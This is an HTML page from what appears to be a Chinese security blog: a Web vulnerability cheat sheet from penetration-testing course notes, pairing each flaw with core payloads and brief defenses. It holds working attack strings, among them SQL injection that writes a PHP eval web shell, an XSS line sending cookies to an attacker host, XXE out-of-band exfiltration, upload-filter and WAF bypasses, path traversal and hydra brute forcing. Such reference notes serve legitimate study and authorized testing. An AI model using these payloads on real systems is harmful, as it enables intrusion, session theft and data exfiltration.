@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Web 漏洞速查与 Payload 手册 | CX-5W 的安全笔记</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="由渗透测试课程笔记提炼的 Web 漏洞速查手册：每个漏洞一张表，原理一句话 + 核心 Payload + 防御。面试和实战随手翻。  ★重点 所有 Payload 仅限自有靶场&#x2F;授权测试使用。  一、SQL 注入★重点 面试高频 原理：后端把用户输入直接拼接进 SQL 语句执行。    类型 核心 Payload 要点    字符型 &#39; or 1&#x3D;1 # 闭合引号，# 注释掉后">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web 漏洞速查与 Payload 手册">
+<meta property="og:url" content="https://cx-5w.github.io/security-notes/payload-handbook/index.html">
+<meta property="og:site_name" content="CX-5W 的安全笔记">
+<meta property="og:description" content="由渗透测试课程笔记提炼的 Web 漏洞速查手册：每个漏洞一张表，原理一句话 + 核心 Payload + 防御。面试和实战随手翻。  ★重点 所有 Payload 仅限自有靶场&#x2F;授权测试使用。  一、SQL 注入★重点 面试高频 原理：后端把用户输入直接拼接进 SQL 语句执行。    类型 核心 Payload 要点    字符型 &#39; or 1&#x3D;1 # 闭合引号，# 注释掉后">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-08-07T01:00:00.000Z">
+<meta property="article:modified_time" content="2026-08-06T16:40:07.179Z">
+<meta property="article:author" content="CX-5W">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="SSRF">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="XXE">
+<meta property="article:tag" content="上传">
+<meta property="article:tag" content="命令执行">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="CX-5W 的安全笔记" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&family=Noto+Sans+SC:wght@400;500;600;700&display=swap" rel="stylesheet">
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">CX-5W 的安全笔记</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">Web 安全 · CTF · 渗透测试</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/security-notes/">安全笔记</a>
+        
+          <a class="main-nav-link" href="/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95">CTF题解</a>
+        
+          <a class="main-nav-link" href="/tools">工具</a>
+        
+          <a class="main-nav-link" href="/projects">项目</a>
+        
+          <a class="main-nav-link" href="/resume">简历</a>
+        
+          <a class="main-nav-link" href="/about">关于我</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          
+            <a class="nav-icon" target="_blank" rel="noopener" href="https://github.com/CX-5W"><span class="fa fa-github"></span></a>
+          
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://cx-5w.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-security-notes-payload-handbook" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/security-notes/payload-handbook/" class="article-date">
+  <time class="dt-published" datetime="2026-08-07T01:00:00.000Z" itemprop="datePublished">2026-08-07</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">安全笔记</a>►<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/Web%E6%BC%8F%E6%B4%9E/">Web漏洞</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Web 漏洞速查与 Payload 手册
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>由渗透测试课程笔记提炼的 <strong>Web 漏洞速查手册</strong>：每个漏洞一张表，原理一句话 + 核心 Payload + 防御。面试和实战随手翻。</p>
+</blockquote>
+<p><span class="badge-key">★重点</span> 所有 Payload 仅限自有靶场&#x2F;授权测试使用。</p>
+<hr>
+<h2 id="一、SQL-注入"><a href="#一、SQL-注入" class="headerlink" title="一、SQL 注入"></a>一、SQL 注入</h2><p><span class="badge-key">★重点</span> <span class="badge-interview">面试高频</span> 原理：后端把用户输入直接拼接进 SQL 语句执行。</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>核心 Payload</th>
+<th>要点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>字符型</td>
+<td><code>&#39; or 1=1 #</code></td>
+<td>闭合引号，<code>#</code> 注释掉后面</td>
+</tr>
+<tr>
+<td>数字型</td>
+<td><code>and 1=1</code> &#x2F; <code>and 1=2</code></td>
+<td>无需闭合引号，逻辑配对判断</td>
+</tr>
+<tr>
+<td>搜索型</td>
+<td><code>%&#39; or 1=1 #</code></td>
+<td>闭合 LIKE 的 <code>%</code> 和引号</td>
+</tr>
+<tr>
+<td>联合查询</td>
+<td><code>-1&#39; union select 1,2,3 #</code></td>
+<td><code>order by</code> 测列数，回显位换查询</td>
+</tr>
+<tr>
+<td>报错注入</td>
+<td><code>and updatexml(1,concat(0x7e,database(),0x7e),1)</code></td>
+<td>无回显有报错时首选，单次 32 字符</td>
+</tr>
+<tr>
+<td>布尔盲注</td>
+<td><code>and length(database())&gt;3</code></td>
+<td>页面正常&#x2F;异常判断</td>
+</tr>
+<tr>
+<td>时间盲注</td>
+<td><code>and sleep(5)</code></td>
+<td>响应延迟判断</td>
+</tr>
+<tr>
+<td>写 Shell</td>
+<td><code>union select 1,&#39;&lt;?php @eval($_POST[x]);?&gt;&#39; into outfile &#39;路径&#39;</code></td>
+<td>需 secure_file_priv 开放+绝对路径+写权限</td>
+</tr>
+</tbody></table>
+<p><strong>脱库固定流程</strong>：<code>version()</code> &#x2F; <code>user()</code> &#x2F; <code>database()</code> → <code>information_schema.tables</code> 爆表 → <code>columns</code> 爆字段 → <code>limit</code> 逐行取数据。</p>
+<p><strong>工具</strong>：<code>sqlmap -u &quot;目标?id=1&quot; --dbs</code>，带登录态用 <code>-r 请求文件</code>，过 WAF 用 <code>--tamper</code>。</p>
+<p><strong>防御</strong>：参数化查询（预编译）是唯一根治方案；最小权限、屏蔽报错、WAF 兜底。</p>
+<hr>
+<h2 id="二、XSS-跨站脚本"><a href="#二、XSS-跨站脚本" class="headerlink" title="二、XSS 跨站脚本"></a>二、XSS 跨站脚本</h2><p><span class="badge-interview">面试高频</span> 三类：存储型（入库持久&#x2F;高危）、反射型（URL 一次性）、DOM 型（前端动态渲染）。</p>
+<table>
+<thead>
+<tr>
+<th>场景</th>
+<th>Payload</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>文本内输出</td>
+<td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+</tr>
+<tr>
+<td>图片事件（自动触发）</td>
+<td><code>&lt;img src=x onerror=alert(1)&gt;</code></td>
+</tr>
+<tr>
+<td>SVG（自动触发）</td>
+<td><code>&lt;svg onload=alert(1)&gt;</code></td>
+</tr>
+<tr>
+<td>属性内输出</td>
+<td><code>&#39; onclick=alert(1) &gt;</code>（引号闭合+事件注入）</td>
+</tr>
+<tr>
+<td>URL 伪协议</td>
+<td><code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;点我&lt;/a&gt;</code></td>
+</tr>
+<tr>
+<td>窃取 Cookie</td>
+<td><code>&lt;img src=x onerror=&quot;new Image().src=&#39;http://攻击者/log?c=&#39;+document.cookie&quot;&gt;</code></td>
+</tr>
+</tbody></table>
+<p><span class="badge-key">★重点</span> 防御：输入过滤 + <strong>输出转义</strong>双端；拿到管理员会话 &#x3D; 拿下后台。</p>
+<hr>
+<h2 id="三、文件上传与解析"><a href="#三、文件上传与解析" class="headerlink" title="三、文件上传与解析"></a>三、文件上传与解析</h2><table>
+<thead>
+<tr>
+<th>防护</th>
+<th>绕过 Payload&#x2F;手法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>前端 JS 校验</td>
+<td>删 JS &#x2F; 抓包改包（<code>shell.png</code> → <code>shell.php</code>）</td>
+</tr>
+<tr>
+<td>MIME 校验</td>
+<td>抓包改 <code>Content-Type: image/jpeg</code></td>
+</tr>
+<tr>
+<td>文件头校验</td>
+<td><code>copy /b 图片.jpg + 木马.php 图片马.jpg</code></td>
+</tr>
+<tr>
+<td>后缀黑名单</td>
+<td>大小写 <code>pHp</code>、双写 <code>pphphp</code>、<code>shell.php.</code>、<code>%00</code> 截断</td>
+</tr>
+<tr>
+<td>图片马执行</td>
+<td>配合解析漏洞&#x2F;文件包含（<code>/shell.jpg/1.php</code>）</td>
+</tr>
+</tbody></table>
+<p><strong>解析漏洞速记</strong>：IIS6 分号截断 <code>shell.asp;.jpg</code>；Apache 多后缀 <code>shell.php.xxx</code>；Nginx <code>cgi.fix_pathinfo=1</code> + 图片马。</p>
+<p><strong>文件包含</strong>：路径可控直接 <code>?page=../../../../etc/passwd</code>；读源码用 <code>php://filter/read=convert.base64-encode/resource=index.php</code>。</p>
+<hr>
+<h2 id="四、命令执行-反序列化"><a href="#四、命令执行-反序列化" class="headerlink" title="四、命令执行 &#x2F; 反序列化"></a>四、命令执行 &#x2F; 反序列化</h2><p><span class="badge-interview">面试高频</span> <strong>PHP 危险函数</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>类别</th>
+<th>函数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>命令执行</td>
+<td><code>system</code> &#x2F; <code>exec</code> &#x2F; <code>shell_exec</code> &#x2F; 反引号 &#x2F; <code>popen</code></td>
+</tr>
+<tr>
+<td>代码执行</td>
+<td><code>eval</code> &#x2F; <code>assert</code> &#x2F; <code>preg_replace /e</code></td>
+</tr>
+</tbody></table>
+<p>命令连接符：<code>;</code>（无条件）、<code>&amp;&amp;</code>（成功才执行）、<code>||</code>（失败才执行）、<code>|</code>（管道）。</p>
+<p><strong>反序列化</strong>：用户可控序列化字符串被直接 <code>unserialize()</code>，触发魔术方法 <code>__construct</code> &#x2F; <code>__destruct</code> 执行代码。重点组件：WebLogic、Shiro、Fastjson、Apache Commons。</p>
+<p><strong>防御</strong>：不反序列化不可信数据；类白名单；升级组件；<code>disable_functions</code>。</p>
+<hr>
+<h2 id="五、SSRF-XXE"><a href="#五、SSRF-XXE" class="headerlink" title="五、SSRF &#x2F; XXE"></a>五、SSRF &#x2F; XXE</h2><table>
+<thead>
+<tr>
+<th>漏洞</th>
+<th>核心 Payload</th>
+<th>利用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SSRF</td>
+<td><code>url=http://127.0.0.1:80</code>、<code>file:///etc/passwd</code>、<code>dict://ip:3306</code></td>
+<td>内网探测、读文件</td>
+</tr>
+<tr>
+<td>XXE</td>
+<td><code>&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></td>
+<td>读文件、内网请求</td>
+</tr>
+<tr>
+<td>XXE 无回显</td>
+<td>实体外带到 <code>http://攻击者/?p=%file;</code></td>
+<td>日志&#x2F;DNSLog 接收</td>
+</tr>
+</tbody></table>
+<p><strong>SSRF 绕过</strong>：进制转换（<code>0xC0A80116</code>）、IP 简写（<code>10.1</code>）、<code>@</code> 解析（<code>http://白名单域名@内网IP</code>）。</p>
+<p><strong>防御</strong>：URL 白名单、协议白名单、过滤内网 IP；XXE 禁用外部实体（PHP <code>libxml_disable_entity_loader(true)</code>）。</p>
+<hr>
+<h2 id="六、越权-逻辑-爆破"><a href="#六、越权-逻辑-爆破" class="headerlink" title="六、越权 &#x2F; 逻辑 &#x2F; 爆破"></a>六、越权 &#x2F; 逻辑 &#x2F; 爆破</h2><p><span class="badge-key">★重点</span> <strong>越权三兄弟</strong>：未授权访问（不登录直访）、水平越权（改 ID 看别人数据）、垂直越权（换身份执行管理员操作）。</p>
+<p>测试法：两个账号抓包 → 找到身份标识（Cookie&#x2F;UID&#x2F;SID）→ 替换 → 放包看结果。</p>
+<p><strong>逻辑漏洞</strong>：支付改价、状态参数篡改（<code>F=0</code>→<code>1</code>）、积分篡改、验证码爆破、短信轰炸——扫描器扫不出，只能手工。</p>
+<p><strong>爆破</strong>：<code>hydra -L users.txt -P pass.txt ssh://目标</code>；Web 表单用 Burp Intruder；验证码前端删 JS、后端吃时效；Token 从响应中递归提取。</p>
+<hr>
+<h2 id="七、WAF-绕过"><a href="#七、WAF-绕过" class="headerlink" title="七、WAF 绕过"></a>七、WAF 绕过</h2><p><span class="badge-interview">面试高频</span> 识别（wafw00f）→ 绕过：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AnD</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>              <span class="comment">-- 大小写</span></span><br><span class="line"><span class="keyword">and</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span>           <span class="comment">-- 注释</span></span><br><span class="line"><span class="comment">/*!50000and*/</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>    <span class="comment">-- 内联注释</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span> <span class="keyword">like</span> <span class="number">1</span>         <span class="comment">-- 等价替换</span></span><br><span class="line"><span class="keyword">and</span><span class="operator">%</span><span class="number">0</span>a1<span class="operator">=</span><span class="number">1</span>            <span class="comment">-- 编码空格</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">0x31</span><span class="operator">=</span><span class="number">0x31</span>        <span class="comment">-- 十六进制</span></span><br></pre></td></tr></table></figure>
+
+<p>组合技：URL 编码 + 双重编码 + 分块传输（Chunked）+ 换请求位置（GET→POST→Cookie）。</p>
+<hr>
+<p><span class="badge-key">★重点</span> <strong>一句话记忆</strong>：有回显联合查，有报错 updatexml，无回显上盲注；上传图片马配解析&#x2F;包含；WAF 规则匹配不到&#x3D;放行。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://cx-5w.github.io/security-notes/payload-handbook/" data-id="cuidYZZXW_n7TgWPqT3loStEW" data-title="Web 漏洞速查与 Payload 手册" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XXE/" rel="tag">XXE</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%B8%8A%E4%BC%A0/" rel="tag">上传</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/security-notes/pentest-checklist/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">前一篇</strong>
+      <div class="article-nav-title">
+        
+          渗透测试全流程速查
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2026/06/25/welcome/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">SQL注入</a> <a href="/tags/SSRF/" style="font-size: 10px;">SSRF</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/XXE/" style="font-size: 10px;">XXE</a> <a href="/tags/%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">上传</a> <a href="/tags/%E4%BB%A3%E7%90%86/" style="font-size: 10px;">代理</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 10px;">信息收集</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 10px;">命令执行</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 10px;">域渗透</a> <a href="/tags/%E5%BA%94%E6%80%A5/" style="font-size: 10px;">应急</a> <a href="/tags/%E6%8A%A4%E7%BD%91/" style="font-size: 10px;">护网</a> <a href="/tags/%E6%8A%A5%E5%91%8A/" style="font-size: 10px;">报告</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size: 10px;">提权</a> <a href="/tags/%E6%9F%A5%E6%9D%80/" style="font-size: 10px;">查杀</a> <a href="/tags/%E6%B5%81%E7%A8%8B/" style="font-size: 10px;">流程</a> <a href="/tags/%E7%AD%89%E4%BF%9D/" style="font-size: 10px;">等保</a> <a href="/tags/%E9%9A%A7%E9%81%93/" style="font-size: 10px;">隧道</a> <a href="/tags/%E9%9D%A2%E8%AF%95/" style="font-size: 10px;">面试</a> <a href="/tags/%E9%A2%98%E5%BA%93/" style="font-size: 10px;">题库</a> <a href="/tags/%E9%AB%98%E9%A2%91/" style="font-size: 10px;">高频</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">安全笔记</a><span class="category-list-count">5</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/Web%E6%BC%8F%E6%B4%9E/">Web漏洞</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E9%9D%A2%E8%AF%95/">面试</a><span class="category-list-count">1</span></li></ul></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/08/">八月 2026</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/06/">六月 2026</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/security-notes/interview-100/">面试高频问答 100 题</a>
+          </li>
+        
+          <li>
+            <a href="/security-notes/incident-response/">应急响应速查</a>
+          </li>
+        
+          <li>
+            <a href="/security-notes/intranet-domain/">内网渗透与域渗透速查</a>
+          </li>
+        
+          <li>
+            <a href="/security-notes/pentest-checklist/">渗透测试全流程速查</a>
+          </li>
+        
+          <li>
+            <a href="/security-notes/payload-handbook/">Web 漏洞速查与 Payload 手册</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2026 CX-5W<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/security-notes/" class="mobile-nav-link">安全笔记</a>
+  
+    <a href="/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95" class="mobile-nav-link">CTF题解</a>
+  
+    <a href="/tools" class="mobile-nav-link">工具</a>
+  
+    <a href="/projects" class="mobile-nav-link">项目</a>
+  
+    <a href="/resume" class="mobile-nav-link">简历</a>
+  
+    <a href="/about" class="mobile-nav-link">关于我</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
